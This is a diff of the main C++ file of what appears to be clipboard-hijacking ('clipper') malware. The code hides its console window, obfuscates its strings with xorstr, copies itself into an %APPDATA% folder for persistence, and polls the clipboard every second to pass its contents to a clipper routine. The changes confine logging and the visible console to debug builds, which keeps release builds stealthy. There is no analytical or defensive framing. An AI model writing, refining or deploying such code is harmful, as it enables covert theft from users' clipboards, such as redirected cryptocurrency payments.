@@ -1,29 +1,26 @@
-#include "config.h";
+#include "config.h"
 #include "other.h"
 #include "clipboard.h"
 #include "clipper.h"
 #include "registry.h"
 #include "console.h"
 
-int main()
-{
+int main() {
     try {
-        if (debugging)
+#ifdef DEBUGGING
             show_console();
-        else
+#else
             hide_console();
+#endif
 
         std::string appdata = getenv(xorstr("APPDATA"));
-        appdata += xorstr("\\");
-        appdata += path;
+        appdata += xorstr("\\") + path;
 
         if (!std::filesystem::exists(appdata))
             std::filesystem::create_directories(appdata);
 
         if (std::filesystem::exists(appdata)) {
-            appdata += xorstr("\\");
-            appdata += exe;
-
+            appdata += xorstr("\\") + exe;
             dupe(appdata);
         }
 
@@ -35,16 +32,15 @@ int main()
             }
         }
 
-        while (true)
-        {
+        while (true) {
             std::string clipboard = get_clipboard_text();
-
             clipper(clipboard);
-
             sleep(1000);
         }
     }
     catch (...) {
-        log("error caught.");
+#ifdef DEBUGGING
+        log("Error caught.");
+#endif
     }
 }
